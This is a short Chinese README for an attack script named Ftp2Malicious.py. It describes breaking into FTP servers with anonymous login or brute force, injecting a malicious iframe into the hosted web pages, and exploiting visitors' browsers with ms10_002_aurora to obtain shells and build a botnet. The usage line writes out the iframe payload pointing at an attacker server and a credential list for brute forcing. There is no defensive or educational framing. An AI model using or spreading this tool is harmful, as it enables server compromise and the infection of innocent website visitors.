#简介

【FTP服务器攻击挂马获取肉鸡】匿名或爆破FTP服务器，下载网页，挂马后上传网页，利用了ms10_002_aurora浏览器漏洞可以攻击受害者，进行监听即可getshell；

'''

usage:python Ftp2Malicious.py -H IP -r '<iframe src="http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt

说明：IP为含有弱口令的FTP服务器，10.10.10.112是我们搭建的被黑的服务器，userpass.txt是账号口令k-v对

'''
